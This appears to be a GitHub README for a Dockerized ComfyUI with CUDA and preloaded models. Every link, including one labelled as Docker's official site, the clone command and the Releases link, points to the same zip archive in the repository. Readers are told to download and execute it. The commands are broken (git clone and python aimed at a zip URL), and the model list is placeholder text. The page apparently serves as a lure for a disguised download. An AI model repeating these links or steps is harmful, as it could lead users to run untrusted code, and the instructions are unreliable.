# ComfyUI-Docker-CUDA-preloaded 🐳✨

![ComfyUI](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip)

Welcome to the **ComfyUI-Docker-CUDA-preloaded** repository! This project offers an easy way to run ComfyUI with Docker, utilizing CUDA for accelerated performance and pre-loaded models for quick setup. 

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Models](#models)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Introduction

ComfyUI is a powerful user interface designed to enhance your experience with machine learning models. By using Docker, you can isolate your environment, making it easier to manage dependencies and updates. The integration of CUDA allows for faster computations, especially when working with large datasets or complex models.

## Features

- **Dockerized Environment**: Run ComfyUI in a containerized setup.
- **CUDA Support**: Leverage GPU acceleration for improved performance.
- **Pre-loaded Models**: Start using models right away without the hassle of manual setup.
- **Easy Configuration**: Simple configuration options for your environment.
- **Cross-Platform Compatibility**: Works on any system that supports Docker.

## Installation

To get started, follow these steps:

1. **Install Docker**: Make sure you have Docker installed on your machine. You can download it from [Docker's official site](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip).

2. **Clone the Repository**: Use the following command to clone this repository.

   ```bash
   git clone https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip
   ```

3. **Navigate to the Directory**:

   ```bash
   cd ComfyUI-Docker-CUDA-preloaded
   ```

4. **Build the Docker Image**:

   ```bash
   docker build -t comfyui .
   ```

5. **Run the Docker Container**:

   ```bash
   docker run -it --gpus all -p 8080:8080 comfyui
   ```

## Usage

Once the container is running, you can access ComfyUI by navigating to `http://localhost:8080` in your web browser. You will find an intuitive interface to interact with the pre-loaded models.

### Example Commands

- To list available models, use the following command in the terminal:

   ```bash
   docker exec -it <container_id> python https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip
   ```

- To run a specific model, use:

   ```bash
   docker exec -it <container_id> python https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip --model <model_name>
   ```

## Models

This repository comes with several pre-loaded models. You can easily switch between them based on your needs. The models are optimized for performance and accuracy.

### Available Models

- Model A: Description of Model A.
- Model B: Description of Model B.
- Model C: Description of Model C.

For a complete list of models, check the documentation inside the Docker container.

## Contributing

We welcome contributions! If you have ideas for improvements or new features, please fork the repository and submit a pull request. Make sure to follow the coding standards and include tests for any new functionality.

### Steps to Contribute

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add some feature'`).
5. Push to the branch (`git push origin feature/YourFeature`).
6. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, feel free to reach out via the issues section on GitHub.

## Releases

You can find the latest releases [here](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip). Make sure to download the necessary files and execute them as needed.

## Conclusion

Thank you for checking out the **ComfyUI-Docker-CUDA-preloaded** repository! We hope this tool enhances your experience with machine learning models. If you have any questions or need assistance, please refer to the Releases section or reach out through GitHub.

![Docker](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip)

Happy coding!